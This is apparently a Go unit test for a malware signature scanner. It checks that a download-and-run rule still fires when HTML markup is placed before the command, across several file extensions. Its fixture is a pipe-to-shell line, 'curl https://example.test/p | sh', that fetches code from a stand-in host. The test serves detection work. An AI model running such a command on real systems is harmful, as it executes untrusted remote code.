package signatures

import "testing"

// Markup at the top of a file does not make a download-and-run command inert:
// a shell skips a first line it cannot run and executes the rest.
func TestHTMLPageDownloadDetectedOnEveryExtension(t *testing.T) {
	s := NewScanner("../../configs")
	if err := s.LoadError(); err != nil {
		t.Fatal(err)
	}
	for _, header := range []string{"<html><code>", "<!DOCTYPE html>\n<pre>\n", "<html x\n", "<!doctype html x\n"} {
		content := []byte(header + "curl https://example.test/p | sh\n")
		for _, ext := range []string{".html", ".php", ".sh", ".cgi", ".txt", ".bin", ""} {
			if !hasRule(s.ScanContent(content, ext), "dropper_wget_exec") {
				t.Errorf("header %q, extension %q: download command not detected", header, ext)
			}
		}
	}
}
